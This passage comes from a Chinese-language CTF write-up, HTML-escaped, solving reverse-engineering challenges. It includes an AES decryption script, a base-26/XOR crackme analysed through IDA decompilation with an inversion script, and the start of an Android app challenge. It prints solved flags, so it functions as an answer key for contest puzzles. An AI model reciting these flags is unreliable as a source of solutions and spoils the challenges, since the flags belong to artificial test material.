&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES


message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&amp;#39;&lt;/span&gt;
encrypt_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; message

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key)
result2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(encrypt_data)
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cipher&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(result2)

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ignore&amp;#39;&lt;/span&gt;)
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rstrip(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rstrip(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rstrip(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x06&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data:&amp;#39;&lt;/span&gt;,a)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到结果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;key: badbadwomen!!!!!!!!!!!!!!!!!!!!!
key length: 32

 data: Nep{up_up_down_down_B_a_b_A_Nep_nep~}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;二十六进制-c--c-逆向&#34;&gt;二十六进制 （c / c++ 逆向）&lt;/h2&gt;
&lt;p&gt;先用exeinfo打开，发现是无壳32位c++代码。&lt;/p&gt;
&lt;p&gt;用ida打开，找到有用的字符串，定位关键代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_4010A0&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v0; &lt;span style=&#34;color:#75715e&#34;&gt;// rax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; Dst; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+0h] [ebp-108h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  memset(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Dst, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFFu&lt;/span&gt;);
  dword_403378 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;8u&lt;/span&gt;);
  Memory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)dword_403378;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(dword_403378 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;plz input right num:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, Dst);
  sub_401060(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Dst, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;);
  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; atoi64(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Dst);
  sub_401120(v0);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入一个数字，将其传入 &lt;code&gt;sub_401120&lt;/code&gt; 函数。&lt;/p&gt;
&lt;p&gt;进入这个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_401120&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// rdi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// cl
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __PAIR__(a1, HIDWORD(a1));
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a1 )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_401F00(__PAIR__(v1, HIDWORD(v1)), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1Au&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
      LODWORD(v1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3;
      v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_402194[HIDWORD(v1) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v2];  &lt;span style=&#34;color:#75715e&#34;&gt;// 2163qwe)(*&amp;amp;^%489$!057@#&amp;gt;&amp;lt;A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      HIDWORD(v1) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
      sub_401160(v4 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v1 );
  }
  sub_401190();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据题目信息的提示，这是把输入数字转换成为26进制，随后进行一个异或运算，然后存到一个地址里。&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;sub_401190&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_401190&lt;/span&gt;()
{
  _DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v0; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v2; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// dl
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v9; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v10; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+10h] [ebp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Memory;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Memory;
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(aFb726);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v3 )
  {
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;v2 )
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;aFb726[v4];
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v2;
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v10 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v2[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v6 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5 )
        v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v10;
      v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7;
      v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// 判断某内存种对应位置是否与 aFb726 字符串相同，相同就在长度上加 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; v3 );
    v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Memory;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v0 ) 
  {
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v0[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
      dword_403378 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)v0;
      Memory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v9;
      free(v0);
      v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Memory;
      &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v8;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( Memory ); &lt;span style=&#34;color:#75715e&#34;&gt;// 释放内存
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v10 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; strlen(aFb726) ) &lt;span style=&#34;color:#75715e&#34;&gt;// 根据之间计算的相同字母数量，判断两个字符串是否相同
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag is Error!!!&amp;#34;&lt;/span&gt;);
    exit(v8);
  }
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag is Right!!!, please md5(&amp;#39;Nep{you_input_num}&amp;#39;) submit th4 flag&amp;#34;&lt;/span&gt;);
  system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);
  exit(v8);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所以只需要将 aFb726 字符串进行反向计算即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Fb72&amp;gt;&amp;amp;6&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2163qwe)(*&amp;amp;^%489$!057@#&amp;gt;&amp;lt;A&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; flag:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     num&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(chr(ord(c) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)))
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; num
[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sum &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; num[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]:
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     sum &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;     sum &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; i
&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; sum
&lt;span style=&#34;color:#ae81ff&#34;&gt;518100101&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行程序进行测试，得到&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;plz input right num:
518100101
flag is Right!!!, please md5(&#39;Nep{you_input_num}&#39;) submit th4 flag
请按任意键继续. . .
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据题目信息，计算一下数字的32位小写md5（一开始算的是 Nep{51&amp;hellip;01} 这个字符串的md5，发现不对，所以算数字的试了一下）&lt;/p&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Nep{967fa25cbea166ded43127f141cff31a}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;password-安卓逆向&#34;&gt;password （安卓逆向）&lt;/h2&gt;
&lt;p&gt;这道题做了好久都没做出来，结果发现是把base64的 &amp;lsquo;+/&amp;rsquo; 记反了&amp;hellip;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;首先用 &lt;code&gt;jeb&lt;/code&gt; 打开，找到 &lt;code&gt;com.nepnep.app&lt;/code&gt; 中的 &lt;code&gt;MainActivity&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MainActivity&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;extends&lt;/span&gt; AppCompatActivity &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Encrypt en&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;loadLibrary&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;native-lib&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;MainActivity&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Encrypt&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Bundle arg4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;arg4&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;setContentView&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x7F0B001C&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// activity_main
